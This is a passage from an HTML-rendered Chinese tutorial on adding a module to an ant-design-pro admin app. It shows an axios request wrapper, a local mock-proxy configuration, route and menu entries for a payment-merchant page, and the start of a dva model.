    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;FormData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;newOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'application/json'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'application/json; charset=utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// newOptions.body = JSON.stringify(newOptions.body);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;----------------request body json-------------------&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// newOptions.body is FormData&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;newOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;content-type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;application/json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;axios&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'GET'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// http请求超时时间&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;checkStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;notification&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// http请求超时处理&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'stack'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'message'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'timeout'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;notification&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;`请求错误&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'很抱歉您的请求已经超时了，请稍后再试！'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;notification&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;`请求错误&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;.roadhogrc.mock.js&lt;/code&gt; 修改如下内容。&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mockjs&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mockjs'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getRule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;postRule&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'./mock/rule'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getActivities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getNotice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getFakeList&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'./mock/api'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getFakeChartData&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'./mock/chart'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getProfileBasicData&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'./mock/profile'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getProfileAdvancedData&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'./mock/profile'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getNotices&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'./mock/notices'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;delay&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'roadhog-api-doc'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 代码中会兼容本地 service mock 以及部署站点的静态数据&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;proxy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 支持值为 Object 和 Array&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;'GET /proxy-get/(.*)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://127.0.0.1:8004/pay-web-rest/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;'POST /proxy-post/(.*)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://127.0.0.1:8004/pay-web-rest/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;'DELETE /proxy-delete/(.*)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://127.0.0.1:8004/pay-web-rest/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 是否禁用代理&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;noProxy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NO_PROXY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'true'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;noProxy&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;proxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;写一个模块&quot;&gt;写一个模块。&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;经过上面的配置，现在已经可以开始写模块了。&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;写一个模块需要配置如下几项。&lt;/p&gt;

    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ant-design-pro/src/common/menu.js &lt;span class=&quot;c&quot;&gt;# 页面菜单，可以配置权限。&lt;/span&gt;
ant-design-pro/src/common/router.js # 该文件内配置全局的 route路径，可以分配访问[models]的权限
ant-design-pro/src/routes # 每一个单独的 route 功能的实现（同等于Page）
ant-design-pro/src/models &lt;span class=&quot;c&quot;&gt;# effects 用来注册请求，访问请求。&lt;/span&gt;
ant-design-pro/src/services &lt;span class=&quot;c&quot;&gt;# 封装 request请求 供给 ‘effects’&lt;/span&gt;
    
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;现在需要在 &lt;code class=&quot;highlighter-rouge&quot;&gt;route&lt;/code&gt; 内加一个路径，也就是我们自己的route
    &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;// park 服务所支持的 route------start&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'/payList/agent-list'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;component&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dynamicWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'parkingPayManager'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../routes/PayManager/PayAgent'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 1. 其中 parkingPayManager 是一个models我们要将这个models注册进来，给这个route使用。&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 2. /payList/agent-list 是`menu`的菜单路径。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;现在需要在 &lt;code class=&quot;highlighter-rouge&quot;&gt;menu&lt;/code&gt; 内加一个菜单。&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'支付商户管理'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;icon&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'table'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'payList'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;children&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'商户管理'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'agent-list'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;添加一个model&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;queryParkManagerAgents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'../services/parkingServices'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kr&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'parkingPayManager'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//我们所有的 dispatch 都是通过这个namespace定位过来的。 所以当请求不通，要注意。&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;QueryAgentData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;effects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;queryAgentList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;put&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//  `{callback}` 替换成 `_` 就是没有参数&lt;/span&gt;
